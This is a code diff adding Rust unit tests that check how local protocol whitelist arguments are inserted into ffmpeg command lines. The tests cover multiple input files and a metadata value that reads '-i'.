+        // Multi-input: first input keeps caller's narrower local whitelist, second input gets default local whitelist.
+        let multi = inject_local_protocol_whitelist(&[
+            "-protocol_whitelist",
+            "file,pipe",
+            "-i",
+            "/srv/media/a.mkv",
+            "-i",
+            "/srv/media/sub.srt",
+            "out.m3u8",
+        ]);
+        assert_eq!(
+            multi,
+            vec_s(&[
+                "-protocol_whitelist",
+                "file,pipe",
+                "-i",
+                "/srv/media/a.mkv",
+                "-protocol_whitelist",
+                WORKER_LOCAL_PROTOCOL_WHITELIST,
+                "-i",
+                "/srv/media/sub.srt",
+                "out.m3u8",
+            ])
+        );
+
+        // Metadata value literally "-i" does not trigger spurious injection.
+        let meta = inject_local_protocol_whitelist(&[
+            "-i",
+            "/srv/media/a.mkv",
+            "-metadata",
+            "-i",
+            "out.m3u8",
+        ]);
+        assert_eq!(
+            meta,
+            vec_s(&[
+                "-protocol_whitelist",
+                WORKER_LOCAL_PROTOCOL_WHITELIST,
+                "-i",
+                "/srv/media/a.mkv",
+                "-metadata",
+                "-i",
+                "out.m3u8",
+            ])
         );
     }
 }
